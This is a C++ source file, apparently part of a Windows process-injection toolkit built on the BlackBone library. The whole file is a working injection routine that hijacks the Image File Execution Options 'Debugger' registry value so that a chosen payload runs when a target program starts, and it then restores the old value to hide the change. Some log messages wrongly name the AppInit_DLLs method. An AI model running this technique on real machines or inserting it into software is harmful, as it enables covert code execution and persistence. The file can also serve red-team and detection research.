#include "../common.h"
#include "inj_ifeo_process_creation.h"

bool InjectorIFEOProcessCreation::Execute(const std::wstring &codeToInject, const std::wstring &targetToInject)
{
	bool ret = false;
	NTSTATUS err = ERROR_SUCCESS;
	DWORD fileSize = 0;
	blackbone::pe::PEImage targetModule;
	blackbone::pe::PEImage sourceModule;
	blackbone::Process targetProc;

	wchar_t OSSystem32Path[MAX_PATH] = { 0 };

	const HKEY rootKey = HKEY_LOCAL_MACHINE;
	const std::wstring subKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
	const std::wstring debuggerSubValue = L"Debugger";
	std::wstring oldDebuggerValue;

	std::wstring TargetToUseAsTrampoline;
	std::wstring TargetToUseAsTrampolineFullPath;

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;
	std::wcout << L"[+] Attaching to target process and parsing source payload" << std::endl;
	if (InjectorHelpers::GetExecutionContext(codeToInject, targetToInject, sourceModule, targetModule))
	{
		std::wstring sourceBaseFileName;
		std::wstring targetBaseFileName;
		if (InjectorHelpers::IsValidFile(targetToInject) &&
			InjectorHelpers::GetBaseFileName(targetToInject, targetBaseFileName) &&
			InjectorHelpers::IsValidFile(codeToInject) &&
			InjectorHelpers::GetBaseFileName(codeToInject, sourceBaseFileName))
		{
			TargetToUseAsTrampoline.assign(sourceBaseFileName);
			TargetToUseAsTrampolineFullPath.assign(codeToInject);
			std::wstring workSubKey(subKey);
			workSubKey.append(TargetToUseAsTrampoline);

			std::wcout << L"[+] Working with reg key at " << workSubKey << std::endl;	

			std::wcout << L"[+] Checking AppInit_DLLs current content" << std::endl;
			if (InjectorHelpers::GetRegStringValue(HKEY_LOCAL_MACHINE, workSubKey, debuggerSubValue, oldDebuggerValue))
			{
				std::wcout << L"[+] Current content of registry value " << debuggerSubValue << L" at " << workSubKey << L" is: " << oldDebuggerValue << std::endl;
			}
			else
			{
				std::wcout << L"[-] The key value " << debuggerSubValue << L" registry value at " << workSubKey << L" was empty." << std::endl;
			}

			std::wcout << L"[+] About to set new value at " << workSubKey << L" with: " << codeToInject << std::endl;
			if (InjectorHelpers::SetRegStringValue(HKEY_LOCAL_MACHINE, workSubKey, debuggerSubValue, codeToInject))
			{
				std::wcout << L"[+] Written  new content " << codeToInject << L" to registry value " << debuggerSubValue << L" at " << workSubKey << std::endl;

				std::wcout << L"[+] About to start new process: " << targetToInject << std::endl;
				if (targetProc.CreateAndAttach(TargetToUseAsTrampolineFullPath) == ERROR_SUCCESS)
				{
					std::wcout << L"[+] New process successfully started. Now resuming it" << std::endl;

					InjectorHelpers::SetRegStringValue(HKEY_LOCAL_MACHINE, workSubKey, debuggerSubValue, oldDebuggerValue);

					std::wcout << L"[+] Success! Code injected via InjectorAppInitDLL method" << std::endl;
					ret = true;
				}
				else
				{
					std::wcout << L"[-] There was a problem starting new process: " << targetToInject << std::endl;
				}

			}
			else
			{
				std::wcout << L"[-] There was a problem writting " << debuggerSubValue << L" registry value at " << workSubKey << std::endl;
			}
		}
		else
		{
			std::wcout << L"[-] There was a problem with target trampoline to use " << TargetToUseAsTrampolineFullPath << std::endl;
		}
	}

	return ret;
}